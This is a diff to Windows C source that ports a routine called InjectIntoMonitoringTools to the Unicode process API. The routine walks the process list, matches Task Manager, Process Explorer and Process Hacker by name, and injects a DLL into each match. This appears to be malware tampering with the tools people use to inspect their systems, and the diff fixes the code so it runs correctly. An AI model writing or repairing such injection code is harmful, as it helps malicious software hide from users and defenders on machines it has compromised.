@@ -7,6 +7,7 @@
 
 #include <windows.h>
 #include <stdio.h>
+#include <wchar.h>
 #include <tlhelp32.h>
 #include <psapi.h>
 
@@ -86,7 +87,7 @@ BOOL InjectDLL(DWORD processId, const char* dllPath) {
 // Get process IDs of monitoring tools
 void InjectIntoMonitoringTools(const char* targetProcess) {
     HANDLE hSnapshot;
-    PROCESSENTRY32 pe32;
+    PROCESSENTRY32W pe32; // Use Unicode version
     DWORD currentPID;
     BOOL injectedAny = FALSE;
     char dllPath[MAX_PATH];
@@ -118,10 +119,10 @@ void InjectIntoMonitoringTools(const char* targetProcess) {
     }
     
     // Initialize the size of the structure
-    pe32.dwSize = sizeof(PROCESSENTRY32);
+    pe32.dwSize = sizeof(PROCESSENTRY32W);
     
     // Get the first process
-    if (!Process32First(hSnapshot, &pe32)) {
+    if (!Process32FirstW(hSnapshot, &pe32)) {
         printf("Error: Could not get first process\n");
         CloseHandle(hSnapshot);
         return;
@@ -132,26 +133,26 @@ void InjectIntoMonitoringTools(const char* targetProcess) {
         // Skip our own process
         if (pe32.th32ProcessID == currentPID)
             continue;
-        
-        // Check if it's a monitoring tool
-        if (_stricmp(pe32.szExeFile, "taskmgr.exe") == 0 ||
-            _stricmp(pe32.szExeFile, "procexp.exe") == 0 ||
-            _stricmp(pe32.szExeFile, "procexp64.exe") == 0 ||
-            _stricmp(pe32.szExeFile, "ProcessHacker.exe") == 0) {
-            
-            printf("Found monitoring tool: %s (PID: %lu)\n", 
-                   pe32.szExeFile, (unsigned long)pe32.th32ProcessID);
-            
+
+        // Check if it's a monitoring tool (UNICODE-safe comparison)
+        if (_wcsicmp(pe32.szExeFile, L"taskmgr.exe") == 0 ||
+            _wcsicmp(pe32.szExeFile, L"procexp.exe") == 0 ||
+            _wcsicmp(pe32.szExeFile, L"procexp64.exe") == 0 ||
+            _wcsicmp(pe32.szExeFile, L"ProcessHacker.exe") == 0) {
+
+            wprintf(L"Found monitoring tool: %ls (PID: %lu)\n",
+                    pe32.szExeFile, (unsigned long)pe32.th32ProcessID);
+
             // Inject the DLL
-            printf("Injecting into %s...\n", pe32.szExeFile);
+            wprintf(L"Injecting into %ls...\n", pe32.szExeFile);
             if (InjectDLL(pe32.th32ProcessID, dllPath)) {
-                printf("Successfully injected into %s\n", pe32.szExeFile);
+                wprintf(L"Successfully injected into %ls\n", pe32.szExeFile);
                 injectedAny = TRUE;
             } else {
-                printf("Failed to inject into %s\n", pe32.szExeFile);
+                wprintf(L"Failed to inject into %ls\n", pe32.szExeFile);
             }
         }
-    } while (Process32Next(hSnapshot, &pe32));
+    } while (Process32NextW(hSnapshot, &pe32));
     
     // Clean up
     CloseHandle(hSnapshot);
